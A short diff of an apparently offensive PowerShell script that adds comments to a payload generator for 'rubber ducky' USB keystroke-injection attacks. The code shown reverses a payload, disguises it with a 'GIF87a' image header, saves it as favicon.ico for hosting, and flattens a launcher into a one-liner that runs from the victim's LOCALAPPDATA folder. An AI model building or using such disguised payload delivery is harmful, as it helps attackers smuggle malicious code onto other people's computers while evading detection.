@@ -1,3 +1,4 @@
+# oneliner payload creation for rubber ducky operations
 
 param(
     [string]$filename,  #filename of the payload
@@ -14,6 +15,7 @@ $replace_value = $reversed[1..10] -join ''
 $obfuscated = $reversed.replace($replace_value,'GIF87a',1)
 
 
+#saves obfuscated payload 
 Out-File -FilePath favicon.ico -InputObject $obfuscated
 Write-Host "favicon.ico is ready for hosting!"
 
@@ -34,6 +36,7 @@ set-location -path `$env:LOCALAPPDATA;
 "@
 
 
+# pretty print the oneliner
 $oneliner = $uncompressed_oneliner -replace ('\r?\n','')
 Write-Host $oneliner
 Out-File -FilePath oneliner.txt -InputObject $oneliner
